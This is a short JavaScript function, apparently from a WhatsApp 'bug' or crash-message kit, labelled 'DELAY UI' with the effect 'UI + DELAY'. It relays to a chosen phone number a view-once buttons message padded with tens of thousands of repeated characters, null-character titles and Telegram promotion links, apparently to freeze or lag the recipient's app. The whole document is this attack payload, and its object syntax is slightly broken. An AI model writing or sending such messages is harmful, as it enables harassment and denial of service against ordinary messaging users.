async function uiNew(amelia, number) {
  await amelia.relayMessage(number, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "Amelia DelayXui",
          contentText: "Amelia DelayXUi" + "ꦽ".repeat(70000),
          contextInfo: {
            forwardingScore: 6,
            isForwarded: true,
            entryPointConversionSource: "global_search_new_chat",
            entryPointConversionApp: "com.whatsapp",
            entryPointConversionDelaySeconds: 1,
            externalAdReply: {
              title: "\u0000",
              body: `Eu ${"x10".repeat(9200)}`,
              previewType: "PHOTO",
              thumbnail: null,
              mediaType: 1,
              renderLargerThumbnail: true,
              sourceUrl: "https://t.me/ipzws"
              }
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/ameliamodders",
                    unconsentedUsersUrl: "https://t.me/ameliamodders",
                    consentedUsersUrl: "https://t.me/ameliamodders",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/ameliamodders",
                    unconsentedUsersUrl: "https://t.me/ameliamodders",
                    consentedUsersUrl: "https://t.me/ameliamodders",
                    cardIndex: 2,
                  },
                ],
              },            
            },
          headerType: 1
        }
      }
    }
  }, { participant: { jid: number } });
}
FUNCTION DELAY UI [ UPDATE ]

EFFECT: UI + DELAY